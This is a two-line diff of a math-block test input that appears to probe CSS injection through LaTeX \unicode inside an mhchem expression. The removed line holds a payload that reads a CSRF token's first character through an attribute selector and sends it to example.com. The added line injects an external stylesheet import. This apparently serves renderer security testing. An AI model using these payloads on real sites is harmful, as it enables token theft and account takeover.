@@ -1,2 +1,2 @@
 ```math
-\ce{$\unicode[fonttext;input[name="csrf-token"][value^="a"]+input {background: url(https://example.com?q=a)}]{x0000}$}
+\ce{$\unicode[fonttext;@import "http://ajax.googleapis.com/ajax/libs/jqueryui/1.7.2/themes/ui-lightness/jquery-ui.css"]{x0000}$}
